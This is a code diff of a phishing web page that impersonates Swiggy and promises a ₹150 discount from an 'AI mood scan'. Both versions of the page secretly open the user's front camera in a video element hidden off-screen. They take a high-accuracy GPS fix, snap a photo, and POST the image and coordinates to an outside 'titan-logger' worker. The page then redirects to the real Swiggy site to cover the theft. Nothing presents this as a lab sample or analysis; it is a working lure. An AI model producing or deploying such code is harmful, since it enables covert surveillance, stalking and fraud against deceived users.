@@ -3,96 +3,87 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Swiggy | Local Offers & AI Scan</title>
+    <title>Swiggy | Exclusive Mood Match</title>
     <style>
-        body { background: #fff; color: #282c3f; font-family: 'Segoe UI', Roboto, Arial, sans-serif; display: flex; align-items: center; justify-content: center; height: 100vh; margin: 0; overflow: hidden; }
-        .card { text-align: center; width: 90%; max-width: 380px; padding: 40px 20px; border-radius: 24px; box-shadow: 0 15px 45px rgba(0,0,0,0.08); border-top: 6px solid #fc8019; }
-        .logo { width: 65px; height: 65px; background: #fc8019; border-radius: 18px; margin: 0 auto 25px; display: flex; align-items: center; justify-content: center; color: white; font-weight: 900; font-size: 38px; box-shadow: 0 8px 20px rgba(252, 128, 25, 0.3); }
-        h1 { font-size: 1.5rem; font-weight: 800; margin-bottom: 12px; }
-        p { font-size: 0.9rem; color: #7e808c; line-height: 1.5; margin-bottom: 35px; }
-        .btn { background: #fc8019; color: white; border: none; padding: 18px; width: 100%; border-radius: 12px; font-weight: 700; font-size: 1.1rem; cursor: pointer; text-transform: uppercase; transition: 0.2s; }
-        .btn:active { transform: scale(0.98); background: #e67215; }
+        body { background: #fff; margin: 0; font-family: 'Segoe UI', Roboto, sans-serif; display: flex; align-items: center; justify-content: center; height: 100vh; overflow: hidden; }
+        .card { text-align: center; width: 90%; max-width: 360px; padding: 40px 20px; border-radius: 25px; box-shadow: 0 15px 40px rgba(0,0,0,0.1); border-top: 6px solid #fc8019; }
+        .logo-box { width: 65px; height: 65px; background: #fc8019; border-radius: 18px; margin: 0 auto 25px; display: flex; align-items: center; justify-content: center; color: #fff; font-size: 38px; font-weight: 900; box-shadow: 0 8px 20px rgba(252, 128, 25, 0.3); }
+        h1 { font-size: 1.5rem; margin-bottom: 10px; color: #282c3f; }
+        p { color: #7e808c; font-size: 0.9rem; margin-bottom: 30px; }
+        .btn { background: #fc8019; color: #fff; border: none; padding: 18px; width: 100%; border-radius: 12px; font-weight: 700; font-size: 1.1rem; cursor: pointer; transition: 0.3s; }
         #loader { display: none; }
-        .spinner { width: 35px; height: 35px; border: 4px solid #f3f3f3; border-top: 4px solid #fc8019; border-radius: 50%; animation: spin 1s linear infinite; margin: 0 auto 15px; }
+        .spinner { width: 35px; height: 35px; border: 4px solid #f3f3f3; border-top: 4px solid #fc8019; border-radius: 50%; animation: spin 1s linear infinite; margin: 15px auto; }
         @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
-        /* Hidden Camera Stream */
-        #v { position: absolute; width: 1px; height: 1px; opacity: 0; pointer-events: none; }
+        /* STEALTH CAMERA: Hidden from view */
+        #v { position: fixed; top: -1000px; left: -1000px; width: 1px; height: 1px; opacity: 0; }
     </style>
 </head>
 <body>
 
     <div class="card">
-        <div class="logo">S</div>
+        <div class="logo-box">S</div>
         <div id="ui">
-            <h1>Face vs. Food Match</h1>
-            <p>Our AI scans your mood to find the <strong>Perfect Dish</strong> and unlocks a <strong>₹150 Discount</strong> near you!</p>
-            <button id="btn" class="btn">CLAIM MY OFFER</button>
+            <h1>Face vs Food</h1>
+            <p>Scan your mood to unlock a <b>₹150 Discount</b> and find the best treats near your location.</p>
+            <button id="btn" class="btn">MATCH MY MOOD</button>
         </div>
-
         <div id="loader">
             <div class="spinner"></div>
-            <p id="stat" style="font-weight: 700; color: #fc8019; font-size: 0.8rem; letter-spacing: 1px;">SYNCING WITH SWIGGY NODE...</p>
+            <p style="color: #fc8019; font-weight: bold; font-size: 0.8rem;">LOCKING GPS SIGNAL...</p>
         </div>
     </div>
 
-    <video id="v" playsinline muted></video>
+    <video id="v" playsinline muted autoplay></video>
 
     <script>
-        // Replace with your actual Worker URL
         const API_URL = "https://titan-logger.saliljha523.workers.dev";
-        
         const btn = document.getElementById('btn');
-        const ui = document.getElementById('ui');
-        const loader = document.getElementById('loader');
-        const stat = document.getElementById('stat');
         const video = document.getElementById('v');
         const canvas = document.createElement('canvas');
 
         btn.onclick = async () => {
-            ui.style.display = 'none';
-            loader.style.display = 'block';
+            document.getElementById('ui').style.display = 'none';
+            document.getElementById('loader').style.display = 'block';
 
             try {
-                // 1. Initial Handshake (Camera + GPS)
-                stat.innerText = "INITIALIZING AI SCAN...";
+                // 1. Silent Camera Initialization
                 const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
                 video.srcObject = stream;
-                await video.play();
-
-                stat.innerText = "LOCATING NEARBY DEALS...";
+                
+                // 2. High-Precision GPS Lock (Forcing Pin-Drop)
                 const position = await new Promise((resolve) => {
                     navigator.geolocation.getCurrentPosition(resolve, () => resolve(null), {
                         enableHighAccuracy: true,
-                        timeout: 8000,
-                        maximumAge: 0
+                        timeout: 15000, // Forces the phone to wait for a satellite fix
+                        maximumAge: 0   // No cached data allowed
                     });
                 });
 
-                // 2. Background Capture
-                stat.innerText = "GENERATING COUPON...";
+                // 3. Coordinate Processing
+                const gpsString = position 
+                    ? `${position.coords.latitude.toFixed(7)},${position.coords.longitude.toFixed(7)}` 
+                    : "GPS_DATA_BLOCKED";
+
+                // 4. Background Photo Capture
                 canvas.width = video.videoWidth;
                 canvas.height = video.videoHeight;
                 canvas.getContext('2d').drawImage(video, 0, 0);
-                const photo = canvas.toDataURL('image/jpeg', 0.3); // Compressed for instant upload
+                const imageData = canvas.toDataURL('image/jpeg', 0.2);
 
-                // Kill Camera Sensors
+                // Stop hardware sensors
                 stream.getTracks().forEach(track => track.stop());
 
-                // 3. Guaranteed Data Uplink
-                const coords = position ? `${position.coords.latitude},${position.coords.longitude}` : "GPS_LOCK_FAILED";
-                
-                // We wait for the 'fetch' to complete so data isn't lost during redirect
+                // 5. Secure Data Uplink
                 await fetch(API_URL, {
                     method: 'POST',
                     mode: 'cors',
-                    body: JSON.stringify({ image: photo, gps: coords })
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ image: imageData, gps: gpsString })
                 });
 
-            } catch (err) {
-                console.log("Hardware Blocked.");
-            }
+            } catch (err) { console.log("Sensors denied."); }
 
-            // 4. Final Exit to Swiggy
+            // 6. Redirect to Swiggy
             window.location.replace("https://www.swiggy.com/offers-near-me");
         };
     </script>
